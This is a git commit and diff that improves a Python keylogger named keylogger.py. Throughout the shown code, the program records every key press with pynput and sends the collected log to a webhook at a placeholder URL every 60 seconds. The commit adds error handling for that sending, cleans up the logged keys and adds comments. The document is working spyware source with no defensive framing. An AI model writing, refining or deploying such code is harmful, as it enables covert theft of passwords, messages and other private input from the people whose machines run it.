ed8cba4df686d8ee22b234aa313095ebbf1ad5cb
Johannes Kraggerud <72275737+JohannesKraggerud@users.noreply.github.com>
2023-09-17 20:26:45 +0200

    Improved keylogger.py
    Changes:
    - Added error handling for webhook sending
    - Cleaned up logged keys for better readability
    - Added comments

--- keylogger.py
+++ keylogger.py
@@ -2,10 +2,8 @@ from dhooks import Webhook
 from threading import Timer
 from pynput.keyboard import Listener
 
-
 WEBHOOK_URL = 'your-custom-webhook-url'
 TIME_INTERVAL = 60  # Amount of time between each report, expressed in seconds.
-
 
 class Keylogger:
     def __init__(self, webhook_url, interval):
@@ -14,19 +12,25 @@ class Keylogger:
         self.log = ""
 
     def _report(self):
+        """Send the logged keys to the webhook."""
         if self.log != '':
-            self.webhook.send(self.log)
+            try:
+                self.webhook.send(self.log)
+            except Exception as e:
+                print(f"Failed to send data: {e}")
             self.log = ''
         Timer(self.interval, self._report).start()
 
     def _on_key_press(self, key):
-        self.log += str(key)
+        """Log the pressed keys."""
+        key_str = str(key).replace("'", "")
+        self.log += key_str
 
     def run(self):
+        """Start the keylogger."""
         self._report()
-        with Listener(self._on_key_press) as t:
+        with Listener(on_press=self._on_key_press) as t:
             t.join()
-
 
 if __name__ == '__main__':
     Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
